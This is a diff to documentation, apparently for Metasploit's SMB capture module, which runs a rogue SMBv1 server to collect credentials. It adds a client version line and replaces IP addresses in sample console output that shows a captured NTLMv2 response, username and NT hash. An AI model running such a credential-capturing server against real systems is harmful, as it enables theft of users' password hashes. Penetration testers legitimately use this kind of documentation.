@@ -24,6 +24,8 @@ This module creates a mock SMBv1 server which accepts credentials before returni
 
 ### Linux Connection via smbclient
 
+Ubuntu 18.04 with `smbclient 4.7.6-Ubuntu` installed.
+
 Based on [shellvoide.com](https://www.shellvoide.com/hacks/how-to-setup-rogue-fake-smb-server-to-capture-credentials/)
 
 You'll need to set `client use spnego = no` under `[global]` in `smb.conf` to ensure SMBv1 compatability.
@@ -37,13 +39,13 @@ johnpwfile => /tmp/john
 msf5 auxiliary(server/capture/smb) > run
 [*] Auxiliary module running as background job 0.
 [*] SMB Captured - 2019-09-25 22:44:04 -0400
-NTLMv2 Response Captured from 192.168.2.142:50978 - 192.168.2.142
+NTLMv2 Response Captured from 2.2.2.2:50978 - 2.2.2.2
 USER:ubuntu DOMAIN:WORKGROUP OS:Unix LM:Samba
 LMHASH:Disabled 
 LM_CLIENT_CHALLENGE:Disabled
 NTHASH:a6b70b49c8d42903fbe6231ce53a21ff 
 NT_CLIENT_CHALLENGE:01010000000000008aee33441474d501f8f62d51f6995359000000000200120057004f0052004b00470052004f005500500000000000
-[*] SMB Capture - Empty hash captured from 192.168.2.142:50978 - 192.168.2.142 captured, ignoring ... 
+[*] SMB Capture - Empty hash captured from 2.2.2.2:50978 - 2.2.2.2 captured, ignoring ... 
 ```
 
 Client:
